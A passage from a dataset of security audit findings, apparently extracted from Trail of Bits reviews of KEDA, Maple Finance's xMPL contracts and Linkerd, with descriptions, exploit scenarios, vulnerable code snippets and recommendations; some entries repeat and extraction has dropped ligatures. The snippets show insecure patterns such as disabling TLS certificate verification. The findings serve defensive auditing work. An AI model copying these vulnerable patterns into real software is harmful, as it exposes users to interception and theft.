of info.enableTLS , which is always true in the block above. This pattern occurs in three locations: pkg/scalers/redis_scaler.go#L472-L476 , pkg/scalers/redis_scaler.go#L496-L500 , and pkg/scalers/redis_scaler.go#L517-L521 . KEDA does not document this insecure behavior, and users likely expect that enableTLS is implemented securely to prevent MitM attacks. The only public mention of this behavior is a stale, closed issue concerning this problem on GitHub . Exploit Scenario A user deploys KEDA with the Redis Lists or Redis Streams scaler. To protect the condentiality and integrity of data in transit between KEDA and the Redis server, the user sets the enableTLS metadata eld to true . Unbeknownst to the user, KEDA has disabled TLS certicate verication, allowing attackers on the network to modify the data in transit. An adversary can then falsify metrics coming from Redis to maliciously inuence the scaling behavior of KEDA and the Kubernetes cluster (e.g., by causing a DoS). Recommendations Short term, add a warning to the public documentation that the enableTLS option, as currently implemented, is not secure. Short term, do not enable InsecureSkipVerify when the user species the enableTLS parameter. 7. Insu\u0000cient check against nil Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-KEDA-7 Target: pkg/scalers/azure_eventhub_scaler.go#L253-L259", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "1. Use of fmt.Sprintf to build host:port string ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "Several scalers use a construct like fmt.Sprintf(\"%s:%s\", host, port) to create a host:port address string from a user-supplied host and port. This approach is problematic when the host is a literal IPv6 address, which should be enclosed in square brackets when the address is part of a resource identier. An address created using simple string concatenation, such as with fmt.Sprintf , may fail to parse when given to Go standard library functions. The following source les incorrectly use fmt.Sprintf to create an address:  pkg/scalers/cassandra_scaler.go:115  pkg/scalers/mongo_scaler.go:191  pkg/scalers/mssql_scaler.go:220  pkg/scalers/mysql_scaler.go:149  pkg/scalers/predictkube_scaler.go:128  pkg/scalers/redis_scaler.go:296  pkg/scalers/redis_scaler.go:364 Recommendations Short term, use net.JoinHostPort instead of fmt.Sprintf to construct network addresses. The documentation for the net package states the following: JoinHostPort combines host and port into a network address of the form host:port . If host contains a colon, as found in literal IPv6 addresses, then JoinHostPort returns [host]:port . Long term, use Semgrep and the sprintf-host-port rule of semgrep-go to detect future instances of this issue.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "2. MongoDB scaler does not encode username and password in connection string ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "The MongoDB scaler creates a connection string URI by concatenating the congured host, port, username, and password: addr := fmt.Sprintf( \"%s:%s\" , meta.host, meta.port) auth := fmt.Sprintf( \"%s:%s\" , meta.username, meta.password) connStr = \"mongodb://\" + auth + \"@\" + addr + \"/\" + meta.dbName Figure 2.1: pkg/scalers/mongo_scaler.go#L191-L193 Per MongoDB documentation, if either the username or password contains a character in the set :/?#[]@ , it must be percent-encoded . However, KEDA does not do this. As a result, the constructed connection string could fail to parse. Exploit Scenario A user congures the MongoDB scaler with a password containing an  @  character, and the MongoDB scaler does not encode the password in the connection string. As a result, when the client object is initialized, the URL fails to parse, an error is thrown, and the scaler does not function. Recommendations Short term, percent-encode the user-supplied username and password before constructing the connection string. Long term, use the custom Semgrep rule provided in Appendix C to detect future instances of this issue.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "3. Prometheus metrics server does not support TLS ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "The KEDA Metrics Adapter exposes Prometheus metrics on an HTTP server listening on port 9022. Though Prometheus supports scraping metrics over TLS-enabled connections, KEDA does not oer TLS for this server. The function responsible for starting the HTTP server, prommetrics.NewServer , does so using the http.ListenAndServe function, which does not enable TLS. func (metricsServer PrometheusMetricServer) NewServer(address string , pattern string ) { http.HandleFunc( \"/healthz\" , func (w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) _, err := w.Write([] byte ( \"OK\" )) if err != nil { log.Fatalf( \"Unable to write to serve custom metrics: %v\" , err) } }) log.Printf( \"Starting metrics server at %v\" , address) http.Handle(pattern, promhttp.HandlerFor(registry, promhttp.HandlerOpts{})) // initialize the total error metric _, errscaler := scalerErrorsTotal.GetMetricWith(prometheus.Labels{}) if errscaler != nil { log.Fatalf( \"Unable to initialize total error metrics as : %v\" , errscaler) } log.Fatal( http.ListenAndServe(address, nil ) ) } Figure 3.1: prommetrics.NewServer exposes Prometheus metrics without TLS ( pkg/prommetrics/adapter_prommetrics.go#L82-L99 ). Exploit Scenario A user sets up KEDA with Prometheus integration, enabling the scraping of metrics on port", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "6. Redis scalers set InsecureSkipVerify when TLS is enabled ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "The Redis Lists scaler (of which most of the code is reused by the Redis Streams scaler) supports the enableTLS option to allow the connection to the Redis server to use Transport Layer Security (TLS). However, when creating the TLSConfig for the Redis client, the scaler assigns the InsecureSkipVerify eld to the value of enableTLS (Figure 6.1), which means that certicate and server name verication is always disabled when TLS is enabled. This allows trivial MitM attacks, rendering TLS ineective. if info.enableTLS { options.TLSConfig = &tls.Config{ InsecureSkipVerify: info.enableTLS, } } Figure 6.1: KEDA sets InsecureSkipVerify to the value of info.enableTLS , which is always true in the block above. This pattern occurs in three locations: pkg/scalers/redis_scaler.go#L472-L476 , pkg/scalers/redis_scaler.go#L496-L500 , and pkg/scalers/redis_scaler.go#L517-L521 . KEDA does not document this insecure behavior, and users likely expect that enableTLS is implemented securely to prevent MitM attacks. The only public mention of this behavior is a stale, closed issue concerning this problem on GitHub . Exploit Scenario A user deploys KEDA with the Redis Lists or Redis Streams scaler. To protect the condentiality and integrity of data in transit between KEDA and the Redis server, the user sets the enableTLS metadata eld to true . Unbeknownst to the user, KEDA has disabled TLS certicate verication, allowing attackers on the network to modify the data in transit. An adversary can then falsify metrics coming from Redis to maliciously inuence the scaling behavior of KEDA and the Kubernetes cluster (e.g., by causing a DoS). Recommendations Short term, add a warning to the public documentation that the enableTLS option, as currently implemented, is not secure. Short term, do not enable InsecureSkipVerify when the user species the enableTLS parameter.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "7. Insu\u0000cient check against nil ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "Within a function in the scaler for Azure event hubs, the object partitionInfo is dereferenced before correctly checking it against nil . Before the object is used, a check conrms that partitionInfo is not nil . However, this check is insucient because the function returns if the condition is met, and the function subsequently uses partitionInfo without additional checks against nil . As a result, a panic may occur when partitionInfo is later used in the same function. func (s *azureEventHubScaler) GetUnprocessedEventCountInPartition(ctx context.Context, partitionInfo *eventhub.HubPartitionRuntimeInformation) (newEventCount int64 , checkpoint azure.Checkpoint, err error ) { // if partitionInfo.LastEnqueuedOffset = -1, that means event hub partition is empty if partitionInfo != nil && partitionInfo.LastEnqueuedOffset == \"-1\" { return 0 , azure.Checkpoint{}, nil } checkpoint, err = azure.GetCheckpointFromBlobStorage(ctx, s.httpClient, s.metadata.eventHubInfo, partitionInfo.PartitionID ) Figure 7.1: partionInfo is dereferenced before a nil check pkg/scalers/azure_eventhub_scaler.go#L253-L259 Exploit Scenario While the Azure event hub performs its usual applications, an application error causes GetUnprocessedEventCountInPartition to be called with a nil partitionInfo parameter. This causes a panic and the scaler to crash and to stop monitoring events. Recommendations Short term, edit the code so that partitionInfo is checked against nil before dereferencing it. Long term, use CodeQL and its go/missing-error-check query to detect future instances of this issue.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. Prometheus metrics server does not support authentication ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf", "body": "When scraping metrics, Prometheus supports multiple forms of authentication , including Basic authentication, Bearer authentication, and OAuth 2.0. KEDA exposes Prometheus metrics but does not oer the ability to protect its metrics server with any of the supported authentication types. Exploit Scenario A user deploys KEDA on a network. An adversary gains access to the network and is able to issue HTTP requests to KEDAs Prometheus metrics server. As KEDA does not support authentication for the server, the attacker can trivially view the exposed metrics. Recommendations Short term, implement one or more of the authentication types that Prometheus supports for scrape targets. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "1. Risk of reuse of signatures across forks due to lack of chain ID validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf", "body": "The ERC20Permit contract implements EIP-2612 functionality, in which a domain separator containing the chain ID is included in the signature schema. However, the chain ID is xed at the time of deployment. In the event of a post-deployment hard fork of the chain, the chain ID cannot be updated, and signatures may be replayed across both versions of the chain. If a change in the chain ID is detected, the domain separator can be cached and regenerated. Exploit Scenario Bob holds tokens worth $1,000 on the mainnet. Bob submits a signature to permit Eve to spend those tokens on his behalf. Later, the mainnet is hard-forked and retains the same chain ID. As a result, there are two parallel chains with the same chain ID, and Eve can use Bobs signature to transfer funds on both chains. Recommendations Short term, to prevent post-deployment forks from aecting calls to permit, add code to permit that checks block.chainId against chainId and recomputes the DOMAIN_SEPARATOR if they are dierent. Long term, identify and document the risks associated with having forks of multiple chains and develop related mitigation strategies. 18 Maple Labs", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Risk of token theft due to race condition in ERC20s approve function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf", "body": "A known race condition in the ERC20 standards approve function could lead to token theft. The ERC20 standard describes how to create generic token contracts. Among others, an ERC20 contract denes these two functions:  transferFrom(from, to, value)  approve(spender, value) These functions can be called to give permission to a third party to spend tokens. When a user calls the approve(spender, value) function, the spender can spend up to the value of the callers tokens by calling transferFrom(user, to, value). This schema is vulnerable to a race condition in which the user calls approve a second time on a spender that has already been approved. Before the second transaction is mined, the spender can call transferFrom to transfer the previously approved value and still receive the authorization to transfer the new approved value. Exploit Scenario Alice calls approve(Bob, 1000), allowing Bob to spend 1,000 tokens. Alice changes her mind and calls approve(Bob, 500). Once mined, this transaction will decrease the number of tokens that Bob can spend to 500. Bob sees the second transactionapprove(Bob, 500)and calls transferFrom(Alice, X, 1000) before it is mined. Bobs transaction is mined before Alices, and Bob transfers 1,000 tokens. Once Alices transaction is mined, Bob calls transferFrom(Alice, X, 500). Essentially, Bob is able to transfer 1,500 tokens even though Alice intended that he be able to transfer only 500. Recommendations Short term, add two non-ERC20 functions allowing users to increase and decrease the approval (increaseAllowance, decreaseAllowance). 19 Maple Labs Long term, when implementing custom ERC20 contracts, use slither-check-erc to check that the contracts adhere to the specication and are protected against this issue. 20 Maple Labs", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "3. Missing check on newAssets decimals ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf", "body": "The Migrator contract allows users to migrate their MPL tokens to a new version of the token; however, it lacks a check to ensure that newAsset's decimals are equal to the old asset's decimals. A migration functionality is implemented in the xMPL contract, allowing users who deposited their MPL tokens to easily migrate them to the new version. constructor(address oldToken_, address newToken_) { oldToken = oldToken_; newToken = newToken_; } Figure 3.1: Migrator.sol#L11-L14 Exploit Scenario Bob, the owner of xMPL, calls performMigration to migrate the underlying asset to the new version, which has dierent decimals. Alice, a Maple user, decides to redeem her shares after the migration, and she receives an incorrect amount due to the dierent decimals on the new asset. Recommendations Short term, in the Migrator contract's constructor, add a check to verify that newAsset's decimals are equal to the old asset's decimals. Long term, when implementing a migration of a component, make sure that checks are in place to verify the correctness of all data related to the migrated component. 21 Maple Labs", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "4. Lack of zero address checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf", "body": "A number of functions in the codebase do not revert if the zero address is passed in for a parameter that should not be set to zero. The following parameters do not have zero address checks:  The owner_ and spender_ parameters of the _approve function  The owner_ and recipient_ parameters of the _transfer function  The recipient_ parameter of the _mint function  The owner_ parameter of the _burn function Exploit Scenario Alice, a user of the xMPL contract, tries to send 100 xMPL tokens; however, she does not set the recipient, and her wallet incorrectly validates it as the zero address. She loses her tokens. Recommendations Short term, add zero address checks for the parameters listed above and for all other parameters for which zero is not an acceptable value. Long term, comprehensively validate all parameters. Avoid relying solely on the validation performed by front-end code, scripts, or other contracts, as a bug in any of those components could prevent them from performing that validation. 22 Maple Labs", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Possibility that users could receive more assets than the amount due ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf", "body": "If totalSupply is zero (i.e., no one has deposited yet), the rst user who deposits after updateVestingSchedule is called could immediately redeem his tokens to get back more of the asset than the amount he deposited. This is possible because, by design, when totalSupply is zero, the number of shares minted corresponds to the number of assets deposited. function convertToShares(uint256 assets_) public view override returns (uint256 shares_) { uint256 supply = totalSupply; // Cache to memory. shares_ = supply == 0 ? assets_ : (assets_ * supply) / totalAssets(); } Figure 5.1: RevenueDistributionToken.sol#L190-L195 Exploit Scenario Bob, the owner of the xMPL contract, decides to deposit rewards. He calls updateVestingSchedule without noticing that there are not yet any depositors. Eve deposits tokens and redeems them in the same transaction, receiving an unfair number of assets (appendix E). Recommendations Short term, make sure there is at least one depositor before calling updateVestingSchedule. Long term, document assumptions about possible edge cases that can occur when operating the protocol. 23 Maple Labs", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "6. Signature malleability due to use of ecrecover ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf", "body": "The ERC20Permit contract implements EIP-2612 functionality, which requires the use of the precompiled EVM contract ecrecover. This contract is susceptible to signature malleability due to non-unique s and v values, which could allow users to conduct replay attacks. However, the current implementation is protected from possible replay attacks due to its use of nonces. function permit(address owner, address spender, uint256 amount, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external override { require(deadline >= block.timestamp, \"ERC20Permit:EXPIRED\"); bytes32 digest = keccak256( abi.encodePacked( \"\\x19\\x01\", DOMAIN_SEPARATOR, keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, amount, nonces[owner]++, deadline)) ) ); address recoveredAddress = ecrecover(digest, v, r, s); require(recoveredAddress == owner && owner != address(0), \"ERC20Permit:INVALID_SIGNATURE\"); _approve(owner, spender, amount); } Figure 6.1: ERC20Permit.sol#L72-L84 Recommendations Short term, to prevent the future misuse of ecrecover, implement appropriate checks on the s and v values to verify that s is in the lower half of the range and v is 27 or 28. Long term, identify and document the risks associated with the use of ecrecover and Maple Labss plans to mitigate them. 24 Maple Labs", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-03-maplefinance-securityreview.pdf", "body": "The Maple contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Maple contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 25 Maple Labs A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Lack of rate-limiting mechanisms in the identity service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The identity service issues signed certicates to sidecar proxies within Linkerd-integrated infrastructure. When proxies initialize for the rst time, they request a certicate from the identity service. However, the identity service lacks sucient rate-limiting mechanisms, which may make it prone to denial-of-service attacks. Because identity controllers are shared among pods in a cluster, a denial of service of an identity controller may aect the availability of applications across the cluster. Threat Scenario An attacker obtains access to the sidecar proxy in one of the user application namespaces. Due to the lack of rate-limiting mechanisms within the identity service, the proxy can now repeatedly request a newly signed certicate as if it were a proxy sidecar initializing for the rst time. Recommendations Short term, add rate-limiting mechanisms to the identity service to prevent a single pod from requesting too many certicates or performing other computationally intensive actions. Long term, ensure that appropriate rate-limiting mechanisms exist throughout the infrastructure to prevent denial-of-service attacks. Where possible, implement stricter access controls to ensure that components cannot interact with APIs more than necessary. Additionally, ensure that the system suciently logs events so that an audit trail is available in the event of an attack. 33 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. Lack of rate-limiting mechanisms in the destination service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The destination service contains trac-routing information for sidecar proxies within Linkerd-integrated infrastructure. However, the destination service lacks sucient rate-limiting mechanisms, which may make it prone to denial-of-service attacks if a pod repeatedly changes its availability status. Because destination controllers are shared among pods in a cluster, a denial of service of a destination controller may aect the availability of applications across the cluster. Threat Scenario An attacker obtains access to the sidecar proxy in one of the user application namespaces. Due to the lack of rate-limiting mechanisms within the destination service, the proxy can now repeatedly request routing information or change its availability status to force updates in the controller. Recommendations Short term, add rate-limiting mechanisms to the destination service to prevent a single pod from requesting too much routing information or performing state updates too quickly. Long term, ensure that appropriate rate-limiting mechanisms exist throughout the infrastructure to prevent denial-of-service attacks. Where possible, implement stricter access controls to ensure that components cannot interact with APIs more than necessary. Additionally, ensure that the system suciently logs events so that an audit trail is available in the event of an attack. 34 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. CLI tool allows the use of insecure protocols when externally sourcing infrastructure denitions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "When using the command-line interface (CLI) tool, an operator may source infrastructural YAML denitions from a URI path specifying any protocol, such as http:// or https://. Therefore, a user could expose sensitive information when using an insecure protocol such as HTTP. Furthermore, the Linkerd documentation does not warn users about the systems use of insecure protocols. Threat Scenario An infrastructure operator integrates Linkerd into her infrastructure. When doing so, she uses the CLI tool to fetch YAML denitions over HTTP. Unbeknownst to her, the use of HTTP has made her data visible to attackers on the local network. Her data is also prone to man-in-the-middle attacks. Recommendations Short term, disallow the use of insecure protocols within the CLI tool when sourcing external data. Alternatively, provide documentation and best practices regarding the use of insecure protocols when externally sourcing data within the CLI tool. 35 Linkerd Threat Model 4. Exposure of admin endpoint may a\u0000ect application availability Severity: Medium Diculty: Medium Type: Awareness and Training Finding ID: TOB-LKDTM-4 Target: linkerd-proxy", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "5. Gos pprof endpoints enabled by default in all admin servers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "All core components of the Linkerd infrastructure, in both the data and control planes, have an admin server with Gos server runtime proler (pprof) endpoints on /debug/pprof enabled by default. These servers are not exposed to the rest of the cluster or to the local network by default. Threat Scenario An attacker scans the network in which a Linkerd cluster is congured and discovers that an operator forwarded the admin server port to the local network, exposing the pprof endpoints to the local network. He connects a proler to it and gains access to debug information, which assists him in mounting further attacks. Recommendations Short term, add a check to http.go that enables pprof endpoints only when Linkerd runs in debug or test mode. Long term, audit all debug-related functionality to ensure it is not exposed when Linkerd is running in production mode. References  Your pprof is showing: IPv4 scans reveal exposed net/http/pprof endpoints 37 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Lack of access controls on the linkerd-viz dashboard ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "Linkerd operators can enable a set of metrics-focused features by adding the linkerd-viz extension. Doing so enables a web UI dashboard that lists detailed information about the namespaces, services, pods, containers, and other resources in a Kubernetes cluster in which Linkerd is congured. Operators can enable Kubernetes role-based access controls to the dashboard; however, no access control options are provided by Linkerd. Threat Scenario An attacker scans the network in which a Linkerd cluster is congured and discovers an exposed UI dashboard. By accessing the dashboard, she gains valuable insight into the cluster. She uses the knowledge gained from exploring the dashboard to formulate attacks that would expand her access to the network. Recommendations Short term, document recommendations for restructuring access to the linkerd-viz dashboard. Long term, add authentication and authorization controls for accessing the dashboard. This could be done by implementing tokens created via the CLI or client-side authorization logic. 38 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "7. Prometheus endpoints reachable from the user application namespace ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The linkerd-viz extension provides a Prometheus API that collects metrics data from the various proxies and controllers used by the control and data planes. Metrics can include various labels with IP addresses, pod IDs, and port numbers. Threat Scenario An attacker gains access to a user application pod and calls the API directly to read Prometheus metrics. He uses the API to gain information about the cluster that aids him in expanding his access across the Kubernetes infrastructure. Recommendations Short term, disallow access to the Prometheus extension from the user application namespace. This could be done in the same manner in which access to the web dashboard is restricted from within the cluster (e.g., by allowing access only for specic hosts). 39 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "8. Lack of egress access controls ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "Linkerd provides access control mechanisms for ingress trac but not for egress trac. Egress controls would allow an operator to impose important restrictions, such as which external services and endpoints that a meshed application running in the application namespace can communicate with. Threat Scenario A user application becomes compromised. As a result, the application code begins making outbound requests to malicious endpoints. The lack of access controls on egress trac prevents infrastructure operators from mitigating the situation (e.g., by allowing the application to communicate with only a set of allowlisted external services). Recommendations Short term, add support for enforcing egress network policies. A GitHub issue to implement this recommendation already exists in the Linkerd repository. 40 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "9. Prometheus endpoints are unencrypted and unauthenticated by default ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The linkerd-viz extension provides a Prometheus API that collects metrics data from the various proxies and controllers used by the control and data planes. However, this endpoint is unencrypted and unauthenticated, lacking access and condentiality controls entirely. Threat Scenario An attacker gains access to a sibling component within the same namespace in which the Prometheus endpoint exists. Due to the lack of access controls, the attacker can now laterally obtain Prometheus metrics with ease. Additionally, due to the lack of condentiality controls, such as those implemented through the use of cryptography, connections are exposed to other parties. Recommendations Short term, consider implementing access controls within Prometheus and Kubernetes to disallow access to the Prometheus metrics endpoint from any machine within the cluster that is irrelevant to Prometheus logging. Additionally, implement secure encryption of connections with the use of TLS within Prometheus or leverage existing Linkerd mTLS schemes. 41 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "10. Shared identity and destination services in a cluster poses risks to multi-application clusters ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The identity and destination controllers are meant to convey certicate and routing information for proxies, respectively. However, only one identity controller and one destination controller are deployed in a cluster, so they are shared among all application pods within a cluster. As a result, a single application pod could pollute records, causing denial-of-service attacks or otherwise compromising these cluster-wide components. Additionally, a compromise of these cluster-wide components may result in the exposure of routing information for each application pod. Although the Kubernetes API server is exposed with the same architecture, it may be benecial to minimize the attack surface area and the data that can be exltrated from compromised Linkerd components. Threat Scenario An attacker gains access to a single user application pod and begins to launch attacks against the identity and destination services. As a result, these services cannot serve other user application pods. The attacker later nds a way to compromise one of these two services, allowing her to leak sensitive application trac from other user application pods. Recommendations Short term, implement per-pod identity and destination services that are isolated from other pods. If this is not viable, consider documenting this caveat so that users are aware of the risks of hosting multiple applications within a single cluster. 42 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "11. Lack of isolation between components and their sidecar proxies ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "Within the Linkerd, linkerd-viz, and user application namespaces, each core component lives alongside a linkerd-proxy container, which proxies the components trac and provides mTLS for internal connections. However, because the sidecar proxies are not isolated from their corresponding components, the compromise of a component would mean the compromise of its proxy, and vice versa. This is particularly interesting when considering the lack of access controls for some components, as detailed in TOB-LKDTM-4: proxy admin endpoints are exposed to the applications they are proxying, allowing metrics collection and shutdown requests to be made. Threat Scenario An attacker exploits a vulnerability to gain access to a linkerd-proxy instance. As a result, the attacker is able to compromise the condentiality, integrity, and availability of lateral components, such as user applications, identity and destination services within the Linkerd namespace, and extensions within the linkerd-proxy namespace. Recommendations Short term, document system caveats and sensitivities so that operators are aware of them and can better defend themselves against attacks. Consider employing health checks that verify the integrity of proxies and other components to ensure that they have not been compromised. Long term, investigate ways to isolate sidecar proxies from the components they are proxying (e.g., by setting stricter access controls or leveraging isolated namespaces between proxied components and their sidecars). 43 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "12. Lack of centralized security best practices documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "While security recommendations are included throughout Linkerds technical guidance documents, there is no centralized guidance on security best practices. Furthermore, the documentation on securing clusters lacks guidance on security best practices such as conguring timeouts and retries, authorization policy recommendations for defense in depth, and locking down access to linkerd-viz components. Threat Scenario A user is unaware of security best practices and congures Linkerd in an insecure manner. As a result, her Linkerd infrastructure is prone to attacks that could compromise the condentiality, integrity, and availability of data handled by the cluster. Recommendations Short term, develop centralized documentation on security recommendations with a focus on security-in-depth practices for users to follow. This guidance should be easy to locate should any user wish to follow security best practices when using Linkerd. 44 Linkerd Threat Model 13. Unclear distinction between Linkerd and Linkerd2 in o\u0000cial Linkerd blog post guidance Severity: Informational Diculty: Informational Type: Awareness and Training Finding ID: TOB-LKDTM-13 Target: Linkerd", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Informational"]}, {"title": "3. CLI tool allows the use of insecure protocols when externally sourcing infrastructure denitions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "When using the command-line interface (CLI) tool, an operator may source infrastructural YAML denitions from a URI path specifying any protocol, such as http:// or https://. Therefore, a user could expose sensitive information when using an insecure protocol such as HTTP. Furthermore, the Linkerd documentation does not warn users about the systems use of insecure protocols. Threat Scenario An infrastructure operator integrates Linkerd into her infrastructure. When doing so, she uses the CLI tool to fetch YAML denitions over HTTP. Unbeknownst to her, the use of HTTP has made her data visible to attackers on the local network. Her data is also prone to man-in-the-middle attacks. Recommendations Short term, disallow the use of insecure protocols within the CLI tool when sourcing external data. Alternatively, provide documentation and best practices regarding the use of insecure protocols when externally sourcing data within the CLI tool. 35 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "4. Exposure of admin endpoint may a\u0000ect application availability ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "User application sidecar proxies expose an admin endpoint that can be used for tasks such as shutting down the proxy server and collecting metrics. This endpoint is exposed to other components within the same pod. Therefore, an internal attacker could shut down the proxy, aecting the user applications availability. Furthermore, the admin endpoint lacks access controls, and the documentation does not warn of the risks of exposing the admin endpoint over the internet. Threat Scenario An infrastructure operator integrates Linkerd into his Kubernetes cluster. After a new user application is deployed, an underlying component within the same pod is compromised. An attacker with access to the compromised component can now laterally send a request to the admin endpoint used to shut down the proxy server, resulting in a denial of service of the user application. Recommendations Short term, employ authentication and authorization mechanisms behind the admin endpoint for proxy servers. Long term, document the risks of exposing critical components throughout Linkerd. For instance, it is important to note that exposing the admin endpoint on a user application proxy server may result in the exposure of a shutdown method, which could be leveraged in a denial-of-service attack. 36 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "12. Lack of centralized security best practices documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "While security recommendations are included throughout Linkerds technical guidance documents, there is no centralized guidance on security best practices. Furthermore, the documentation on securing clusters lacks guidance on security best practices such as conguring timeouts and retries, authorization policy recommendations for defense in depth, and locking down access to linkerd-viz components. Threat Scenario A user is unaware of security best practices and congures Linkerd in an insecure manner. As a result, her Linkerd infrastructure is prone to attacks that could compromise the condentiality, integrity, and availability of data handled by the cluster. Recommendations Short term, develop centralized documentation on security recommendations with a focus on security-in-depth practices for users to follow. This guidance should be easy to locate should any user wish to follow security best practices when using Linkerd. 44 Linkerd Threat Model", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Informational"]}, {"title": "13. Unclear distinction between Linkerd and Linkerd2 in o\u0000cial Linkerd blog post guidance ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-threatmodel.pdf", "body": "The ocial Linkerd documentation clearly indicates the version of Linkerd that each document pertains to. For instance, documentation specic to Linkerd 1.x displays a message stating, This is not the latest version of Linkerd! However, guidance documented in blog post form on the same site does not provide such information. For instance, the rst result of a Google search for Linkerd RBAC is a Linkerd blog post with guidance that is applicable only to linkerd 1.x, but there is no indication of this fact on the page. As a result, users who rely on these blog posts may misunderstand functionality in Linkerd versions 2.x and above. Threat Scenario A user 